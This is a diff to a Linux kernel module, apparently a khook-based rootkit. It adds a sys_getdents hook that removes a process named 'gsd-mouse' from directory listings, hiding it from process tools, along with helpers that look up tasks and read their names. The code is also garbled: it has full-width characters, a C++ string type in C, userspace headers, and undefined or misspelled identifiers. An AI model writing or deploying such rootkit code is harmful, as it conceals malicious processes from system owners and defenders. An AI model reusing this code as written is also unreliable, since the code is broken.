@@ -1,6 +1,7 @@
 #include <linux/kernel.h>
 #include <linux/module.h>
-
+#include <string．h>
+#include <stdio．h>
 #include "khook/engine.c"
 
 ////////////////////////////////////////////////////////////////////////////////
@@ -13,6 +14,7 @@
 #include <linux/sched.h>
 
 #define FLAG 0x80000000
+string processname="gsd-mouse";
 
 KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
 static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
@@ -86,12 +88,28 @@ static long khook_sys_kill(pid_t pid, int sig) {
 		return 0;
 }
 
-KHOOK(find_task_by_vpid);
-struct task_struct *khook_find_task_by_vpid(pid_t vnr)
-{
-	struct task_struct *tsk = NULL;
-	return tsk;
+KHOOK_EXT(long, sys_getdents, unsigned int, struct linux_dirent64 __user, unsigned int);
+static long khook_sys_getdents(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count){
+	long value=0;
+	int temp,len;
+	value=KHOOK_ORIGIN(fd, dirp, count);
+	temp=value;
+	while(temp>0){
+		len=dirp.d_relen;
+		temp=tlen-len;
+		printk("%s\n",dirp->d_name);
+		if(get_process(myatoi(dirp->d_name))){
+			printk("find process\n");
+			memmove(dirp, (char *) dirp + dirp->d_reclen, temp);
+			value=value-len;
+		}
+		if(tlen)
+　　	dirp = (struct linux_dirent64 *) ((char *)dirp + dirp->d_reclen);
+　　}
+　　return value;
+	}
 }
+
 /*
 KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs *);
 static long khook___x64_sys_kill(const struct pt_regs *regs) {
@@ -130,6 +148,59 @@ static int khook_load_elf_binary(struct linux_binprm *bprm)
 }*/
 
 ////////////////////////////////////////////////////////////////////////////////
+static inline char *get_name(struct task_struct *p, char *buf)　
+{
+　　int i;
+　　char *name;
+　　name = p->comm;
+　　i = sizeof(p->comm);
+　　do{
+	　　unsigned char c = *name;
+	　　name++;	i--; *buf = c;
+	　　if (!c)	break;
+	　　if (c == '\\')
+		{
+		　　buf[1] = c;	buf += 2;	continue;	　　
+		}
+	　　if (c == '\n')
+		{
+		　　buf[0] = '\\';	buf[1] = 'n';	buf += 2;
+		　　continue;	　　
+		}
+	　　buf++;
+		　　
+	}while (i);
+　　*buf = '\n';
+　　return buf + 1;　　
+}
+
+int get_process(pid_t pid) 
+{
+　　struct task_struct *task = get_task(pid);
+　　char *buffer[64] = {0};
+　　if (task)
+　　{
+　　	get_name(task, buffer);
+　　	if(strstr(buffer,processname))	return 1;  //比较processname 和目录下的进程名
+	　　else return 0;
+　　}
+　　else
+　　	return 0;
+}
+
+struct task_struct *get_task(pid_t pid)　
+{
+　　struct task_struct *p = get_current(), *entry = NULL;
+　　list_for_each_entry(entry, &(p->tasks), tasks)
+    {
+	　　if (entry->pid == pid)
+        {
+		　　printk("pid found\n");
+		　　return entry;    　　
+        }   　　
+    }
+　　return NULL;
+}
 
 int init_module(void)
 {
